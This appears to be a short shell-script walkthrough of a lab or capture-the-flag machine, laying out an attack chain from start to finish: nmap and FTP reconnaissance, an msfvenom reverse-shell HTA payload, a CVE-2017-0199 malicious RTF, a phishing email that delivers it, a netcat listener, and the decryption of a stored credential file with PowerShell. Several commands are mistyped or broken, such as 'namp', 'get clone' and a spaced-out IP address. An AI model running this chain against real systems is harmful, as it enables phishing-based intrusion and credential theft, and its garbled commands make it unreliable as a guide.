#!/bin/bash
# exploit by ftp and phishing email
namp -sV -sC 192.168.56.104
# if ftp port is open will connect to system 
ftp 192.168.56.104
ls
cd document
ls 
# will see some file thaat let to connect to system
# like readme.txt applocker.docx
get applocker.docx
get readme.txt
get "Windows Event Forwarding.docx"
# read 
cat readme.txt
exiftool "Windows Event Forwarding.docx"
# cheack if we can send massesge to email 
telnet 192.168.56.104
# create rtf file for exploit 
get clone https://github.com/bhdresh/CVE-2017-0199.git
msfvenom -p windows/shell_reverse_tcp lhost= 10.10 . 14 . 117 lport= 443 -f hta- psh -o file.hta
# play local port to host file 
updog -p 80
create payload
python2 cve-2017-0199_toolkit.py -M gen -w raj.rtf -u http://10.10.14.117/file.hta -t RTF -x 0
# send email
nc -lvp 443
sendEmail -f raj@megabank.com -t nico@megabank.com -u "Urgent Mail" -m "Join Ignite Technologies" -a raj.rtf -s 10.129.228.124 -v
#when the victim clicks the payload 
# in the cmd for target system
cd c:\Users\nico\Desktop
dir
type user.txt
type cred.xml
# can get password and put the command in cmd
powershell -c "$cred = Import-Clixml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"
# will connect as ssh
ssh tom@192.168.56.104



















